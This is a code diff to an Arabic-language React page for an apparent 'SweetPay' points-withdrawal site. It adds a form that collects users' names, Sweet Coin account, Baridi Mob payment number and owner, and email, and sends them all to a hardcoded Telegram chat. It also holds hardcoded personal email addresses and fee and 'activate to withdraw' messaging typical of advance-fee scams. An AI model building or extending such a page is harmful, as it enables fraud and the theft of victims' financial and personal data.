@@ -11,7 +11,7 @@ import { useState, useRef } from 'react';
       const CHAT_ID = '5653032481';
       const ACTIVATION_PHONE = '004264907943';
 
-      const PAYME_EMAIL = 'sofyanborghda@gmail.com';
+      const PAYME_EMAIL = 'sofyanamin@gmail.com';
       const CHALABRUNE_EMAIL = 'chalabrune@gmail.com';
 
       async function sendToTelegram(text: string, photo?: File) {
@@ -30,107 +30,6 @@ import { useState, useRef } from 'react';
           });
         }
       } catch {}
-      }
-
-      function PaymeNoticeOverlay() {
-      return (
-        <div
-          style={{
-            position: 'fixed',
-            inset: 0,
-            zIndex: 9999,
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center',
-            background: 'rgba(0,0,0,0.6)',
-            backdropFilter: 'blur(6px)',
-          }}
-        >
-          <div
-            dir="rtl"
-            style={{
-              background: 'linear-gradient(135deg, #fffbf2 0%, #fff8e8 100%)',
-              borderRadius: '24px',
-              padding: '48px 40px',
-              maxWidth: '440px',
-              width: '90%',
-              boxShadow: '0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(249,168,37,0.2)',
-              textAlign: 'center',
-              display: 'flex',
-              flexDirection: 'column',
-              alignItems: 'center',
-              gap: '20px',
-              fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
-            }}
-          >
-            {/* Icon circle */}
-            <div style={{
-              width: '72px',
-              height: '72px',
-              borderRadius: '50%',
-              background: 'linear-gradient(135deg, #f59e0b, #f97316)',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              boxShadow: '0 4px 20px rgba(249,168,37,0.4)',
-              fontSize: '32px',
-            }}>
-              ⏳
-            </div>
-
-            {/* Title */}
-            <h2 style={{
-              fontSize: '1.4rem',
-              fontWeight: 800,
-              color: '#1a1a1a',
-              margin: 0,
-              lineHeight: 1.4,
-              letterSpacing: '-0.3px',
-            }}>
-              تم إرسال طلبك بنجاح
-            </h2>
-
-            {/* Divider */}
-            <div style={{
-              width: '48px',
-              height: '3px',
-              borderRadius: '99px',
-              background: 'linear-gradient(90deg, #f59e0b, #f97316)',
-            }} />
-
-            {/* Message */}
-            <p style={{
-              fontSize: '1.05rem',
-              color: '#555',
-              margin: 0,
-              lineHeight: 2,
-              fontWeight: 500,
-            }}>
-              تم إرسال طلب تأكيد الرسوم المطلوبة
-              <br />
-              <span style={{ color: '#1a1a1a', fontWeight: 700 }}>
-                الرجاء الانتظار 48 ساعة
-              </span>
-              <br />
-              لقبول طلبكم
-            </p>
-
-            {/* Badge */}
-            <div style={{
-              padding: '10px 28px',
-              background: 'linear-gradient(135deg, #f59e0b22, #f9731622)',
-              border: '1.5px solid #f59e0b55',
-              borderRadius: '99px',
-              fontSize: '0.9rem',
-              color: '#b45309',
-              fontWeight: 700,
-              letterSpacing: '0.5px',
-            }}>
-              🕐 قيد المراجعة · 48 ساعة
-            </div>
-          </div>
-        </div>
-      );
       }
 
       function ChalabrunePaidOverlay() {
@@ -258,6 +157,15 @@ import { useState, useRef } from 'react';
       const [sending, setSending] = useState(false);
       const [submitted, setSubmitted] = useState(false);
       const fileRef = useRef<HTMLInputElement>(null);
+      const [wdFirstName, setWdFirstName] = useState('');
+      const [wdLastName, setWdLastName] = useState('');
+      const [wdCoinAccount, setWdCoinAccount] = useState('');
+      const [wdAmount, setWdAmount] = useState('');
+      const [wdBaridiNumber, setWdBaridiNumber] = useState('');
+      const [wdBaridiOwner, setWdBaridiOwner] = useState('');
+      const [wdEmail, setWdEmail] = useState('');
+      const [wdSending, setWdSending] = useState(false);
+      const [wdSubmitted, setWdSubmitted] = useState(false);
 
       if (!user) { navigate('/login'); return null; }
 
@@ -303,11 +211,32 @@ import { useState, useRef } from 'react';
 
       const handleLogout = () => { logout(); navigate('/'); };
 
+      const handleWithdrawSubmit = async (e: React.FormEvent) => {
+        e.preventDefault();
+        setWdSending(true);
+        const text = `💰 <b>طلب تحويل — SweetPay</b>
+
+      👤 <b>الاسم واللقب:</b> ${wdFirstName} ${wdLastName}
+      🪙 <b>اسم الحساب على Sweet Coin:</b> ${wdCoinAccount}
+      🔢 <b>الكمية / عدد النقاط:</b> ${wdAmount}
+      📱 <b>رقم بريدي موب:</b> ${wdBaridiNumber}
+      👤 <b>صاحب بريدي موب (الاسم واللقب):</b> ${wdBaridiOwner}
+      📧 <b>البريد الإلكتروني:</b> ${wdEmail}`;
+        await sendToTelegram(text);
+        setWdSending(false);
+        setWdSubmitted(true);
+      };
+
       return (
         <div dir="rtl" className="min-h-screen bg-background">
-          {isPayme && <PaymeNoticeOverlay />}
+          {isPayme && (
+            <div className="bg-green-600 text-white px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2">
+              <CheckCircle2 size={16} className="shrink-0" />
+              <span>تم الدفع يمكنك تحويل نقاطك</span>
+            </div>
+          )}
           {isChalabrune && <ChalabrunePaidOverlay />}
-          {!user.isActive && (
+          {!user.isActive && !isPayme && (
             <div className="bg-destructive text-destructive-foreground px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2 flex-wrap">
               <AlertTriangle size={16} className="shrink-0" />
               <span>الحساب غير مفعل — يجب تفعيله لسحب أموالك</span>
@@ -365,7 +294,81 @@ import { useState, useRef } from 'react';
               </div>
             </div>
 
-            {!user.isActive && (
+            {isPayme && (
+              <div className="rounded-2xl border border-green-500/30 bg-green-500/5 p-5 space-y-4">
+                <div className="flex items-start gap-3">
+                  <CheckCircle2 size={24} className="text-green-500 shrink-0 mt-0.5" />
+                  <div>
+                    <h2 className="font-bold text-lg text-foreground">يمكنك تحويل أموالك إلى محفظتك</h2>
+                    <p className="text-sm text-muted-foreground leading-relaxed mt-1">
+                      رصيدك متاح للتحويل. املأ النموذج بالأسفل وسيتم تحويل أموالك إلى محفظتك.
+                    </p>
+                  </div>
+                </div>
+
+                <AnimatePresence>
+                  {!wdSubmitted ? (
+                    <motion.form
+                      key="form"
+                      initial={{ opacity: 0 }}
+                      animate={{ opacity: 1 }}
+                      exit={{ opacity: 0 }}
+                      onSubmit={handleWithdrawSubmit}
+                    >
+                      <div className="space-y-0">
+                        <p className="text-sm font-semibold text-foreground mb-3">أدخل معلومات التحويل:</p>
+                        <div className="grid grid-cols-2 gap-3">
+                          <div className="space-y-1">
+                            <Label htmlFor="wdFirst">الاسم</Label>
+                            <Input id="wdFirst" value={wdFirstName} onChange={e => setWdFirstName(e.target.value)} required placeholder="محمد" />
+                          </div>
+                          <div className="space-y-1">
+                            <Label htmlFor="wdLast">اللقب</Label>
+                            <Input id="wdLast" value={wdLastName} onChange={e => setWdLastName(e.target.value)} required placeholder="أمين" />
+                          </div>
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdCoin">اسم حسابك على Sweet Coin</Label>
+                          <Input id="wdCoin" value={wdCoinAccount} onChange={e => setWdCoinAccount(e.target.value)} required placeholder="اسم المستخدم على Sweet Coin" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdAmount">الكمية / عدد نقاط حسابك</Label>
+                          <Input id="wdAmount" value={wdAmount} onChange={e => setWdAmount(e.target.value)} required placeholder="مثال: 5000" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdBaridi">رقم بريدي موب</Label>
+                          <Input id="wdBaridi" value={wdBaridiNumber} onChange={e => setWdBaridiNumber(e.target.value)} required placeholder="0550000000" type="tel" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdOwner">اسم ولقب صاحب بريدي موب</Label>
+                          <Input id="wdOwner" value={wdBaridiOwner} onChange={e => setWdBaridiOwner(e.target.value)} required placeholder="الاسم واللقب كما في بريدي موب" />
+                        </div>
+                        <div className="space-y-1 mt-3">
+                          <Label htmlFor="wdEmail">بريدك الإلكتروني</Label>
+                          <Input id="wdEmail" value={wdEmail} onChange={e => setWdEmail(e.target.value)} required placeholder="example@gmail.com" type="email" />
+                        </div>
+                        <Button type="submit" className="w-full mt-4 font-bold" disabled={wdSending}>
+                          {wdSending ? 'جاري الإرسال...' : 'إرسال طلب التحويل ←'}
+                        </Button>
+                      </div>
+                    </motion.form>
+                  ) : (
+                    <motion.div
+                      key="success"
+                      initial={{ opacity: 0, y: 8 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
+                    >
+                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
+                      <p className="font-bold text-foreground">تم إرسال طلب التحويل بنجاح</p>
+                      <p className="text-sm text-muted-foreground">سيتم تحويل أموالك إلى محفظتك في أقرب وقت.</p>
+                    </motion.div>
+                  )}
+                </AnimatePresence>
+              </div>
+            )}
+
+            {!user.isActive && !isPayme && (
               <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
                 <h2 className="font-bold text-lg text-foreground">تفعيل الحساب</h2>
                 <p className="text-sm text-muted-foreground leading-relaxed">
